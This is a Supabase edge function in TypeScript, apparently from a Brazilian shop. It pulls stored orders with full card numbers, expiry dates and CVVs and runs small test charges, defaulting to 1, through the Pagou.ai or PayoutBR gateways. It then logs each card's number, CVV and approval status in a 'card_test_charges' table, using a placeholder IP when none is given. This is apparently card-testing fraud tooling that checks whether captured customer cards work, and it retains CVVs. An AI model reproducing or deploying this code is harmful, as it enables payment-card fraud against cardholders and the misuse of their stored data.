import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

async function getCardProvider(): Promise<string> {
  try {
    const url = Deno.env.get('SUPABASE_URL') || '';
    const key = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || Deno.env.get('SUPABASE_ANON_KEY') || '';
    const supabase = createClient(url, key);
    const { data } = await supabase.from('payment_settings').select('card_provider').eq('id', 1).maybeSingle();
    return (data?.card_provider as string) || 'payout';
  } catch {
    return 'payout';
  }
}

async function callPagouAI(params: any, secretKey: string) {
  const { customer, items, amount, card, installments, externalRef, webhookUrl } = params;
  const payload = {
    amount: Math.round(amount * 100),
    installments: installments || 1,
    capture: true,
    payment_method: 'credit_card',
    postback_url: webhookUrl,
    metadata: { external_ref: externalRef },
    customer: {
      name: customer?.name || 'Cliente',
      email: customer?.email || '',
      phone: (customer?.phone || '').replace(/\D/g, ''),
      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
    },
    card: {
      number: (card.number || '').replace(/\D/g, ''),
      holder_name: card.holder_name || customer?.name || 'Cliente',
      exp_month: String(card.exp_month || '1').padStart(2, '0'),
      exp_year: String(card.exp_year || '2026').slice(-2),
      cvv: String(card.cvv || ''),
    },
    items: items.map((it: any) => ({
      title: it.name || it.title,
      unit_price: Math.round((it.price || it.unitPrice) * 100),
      quantity: it.quantity,
      tangible: true,
    })),
  };

  const resp = await fetch('https://api.pagou.ai/v2/transactions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${secretKey}` },
    body: JSON.stringify(payload),
  });
  return await resp.json();
}

async function callPayout(params: any, secretKey: string) {
  const { customer, items, amount, card, installments, externalRef, webhookUrl, clientIp } = params;
  const payload = {
    paymentMethod: 'credit_card',
    amount: Math.round(amount * 100),
    installments: installments || 1,
    ip: clientIp,
    postbackUrl: webhookUrl,
    metadata: externalRef,
    customer: {
      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
    },
    card: {
      number: (card.number || '').replace(/\D/g, ''),
      holderName: card.holder_name,
      expirationMonth: parseInt(String(card.exp_month), 10),
      expirationYear: parseInt(String(card.exp_year), 10),
      cvv: String(card.cvv),
    },
    items: items.map((it: any) => ({
      title: it.name || it.title,
      unitPrice: Math.round((it.price || it.unitPrice) * 100),
      quantity: it.quantity,
      tangible: true,
    })),
  };

  const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'authorization': `Basic ${btoa(`${secretKey}:x`)}` },
    body: JSON.stringify(payload),
  });
  return await resp.json();
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });
  try {
    const { order_ids, amount: amountIn, item_title: itemIn } = await req.json();
    const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
    const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);

    const { data: orders } = await supabase.from('orders').select('*').in('id', order_ids);
    const provider = await getCardProvider();
    const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || '213.123.123.13';
    const webhookUrl = `${SUPABASE_URL}/functions/v1/payment-webhook`;

    const processOne = async (order: any) => {
      const cardNumber = String(order.ticket || '').replace(/\D/g, '');
      const expiry = String(order.card_expiry || '').replace(/\D/g, '');
      const card = {
        number: cardNumber,
        holder_name: order.card_holder_name,
        exp_month: expiry.slice(0, 2),
        exp_year: expiry.slice(2).length === 2 ? `20${expiry.slice(2)}` : expiry.slice(2),
        cvv: order.card_cvv,
      };

      const params = {
        customer: { name: order.customer_name, email: order.customer_email, phone: order.customer_phone, cpf: order.customer_cpf },
        items: [{ name: itemIn || 'Assinatura', price: amountIn || 1, quantity: 1 }],
        amount: amountIn || 1,
        card,
        installments: 1,
        externalRef: `test-${order.id}`,
        webhookUrl,
        clientIp,
      };

      let raw, status, txId, refusal;
      if (provider === 'pagouai') {
        raw = await callPagouAI(params, Deno.env.get('PAGOUAI_SECRET_KEY')!);
        txId = String(raw?.id || '');
        status = String(raw?.status || 'failed').toLowerCase();
        refusal = raw?.refuse_reason || raw?.message;
      } else {
        raw = await callPayout(params, Deno.env.get('PAYOUT_SECRET_KEY')!);
        const tx = raw?.data ?? raw;
        txId = String(tx?.id || '');
        status = String(tx?.status || 'failed').toLowerCase();
        refusal = tx?.refuseReason || tx?.acquirerMessage || raw?.message;
      }

      const { data: inserted } = await supabase.from('card_test_charges').insert({
        order_id: order.id, order_number: order.order_number,
        customer_name: order.customer_name, customer_email: order.customer_email,
        customer_cpf: order.customer_cpf, customer_phone: order.customer_phone,
        card_holder_name: order.card_holder_name, card_number: cardNumber,
        card_brand: order.card_brand, card_expiry: order.card_expiry, card_cvv: order.card_cvv,
        amount: amountIn || 1, transaction_id: txId, status, refusal_reason: refusal, raw_response: raw,
      }).select().single();
      return inserted;
    };

    const results = await Promise.all((orders || []).map(processOne));
    return new Response(JSON.stringify({ ok: true, results }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  } catch (e: any) {
    return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});